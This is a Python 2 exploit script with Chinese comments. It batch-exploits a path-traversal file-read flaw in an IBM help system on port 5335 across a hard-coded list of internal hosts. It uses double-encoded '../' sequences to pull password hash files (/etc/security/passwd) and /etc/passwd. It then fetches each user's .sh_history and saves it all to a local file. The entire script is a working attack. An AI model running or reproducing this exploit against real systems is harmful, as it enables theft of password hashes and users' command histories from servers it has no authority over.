#!/usr/bin/env python
#coding:utf-8
#version: python2.7
#source: lxb
#edit: shuichon

'''
用于利用5335端口上IBM中文帮助系统的任意文件读取、下载漏洞，批量获取.sh_history及密码hash文件。
'''

import urllib2
host = 'http://10.175.104.69:5335/'
url_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'

url_list = ["http://10.48.241.74:5335", "http://10.48.241.75:5335", "http://10.48.241.55:5335", "http://10.48.241.57:5335"]
# url_list = ["http://10.48.241.74:5335"]

# 去除passwd_url行末‘/’，以及对下面两个参数行首添加‘/’
rfi_url = '/help/topic/com.ibm.isclite.cp.help/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e'
suffix_url = '/help/topic/com.ibm.isclite.cp.help/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd'
hash_url = '/help/topic/com.ibm.isclite.cp.help/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/security/passwd'

g = file('history.txt', 'w')
    


def get_history(url):
    req = urllib2.Request(url)
    print url
    req.add_header('User-Agent',url_agent)
    try:
        response = urllib2.urlopen(req)
        for line in response.readlines():
            g.write(line)
    except Exception,e:
        print e

def main():
    for url in url_list:
        shadow = url + hash_url
        print('Get hash of %s ' % url)
        g.writelines('Get hash of %s ' % url + '\n')
        req = urllib2.Request(shadow)
        resp = urllib2.urlopen(req)
        for l in resp.readlines():
            g.writelines(l)

        # 循环遍历，获取历史操作命令
        url1 = url + suffix_url
        print('URL：', url1)
        req = urllib2.Request(url1)
        req.add_header('User-Agent',url_agent)
        try:
            response = urllib2.urlopen(req)
            for line in response.readlines():
                dir_oracle = line.split(':')[5]
                print('The user is :', dir_oracle + '\n')
                g.writelines('The user is :' + dir_oracle + '\n')
                url2 = url + rfi_url + dir_oracle + '/.sh_history'
                print('The sh_history URL is :', url2)
                g.writelines('The sh_history URL is :' + url2 + '\n')
                get_history(url2)
        except Exception,e:
            print e


if __name__ == '__main__':
    main()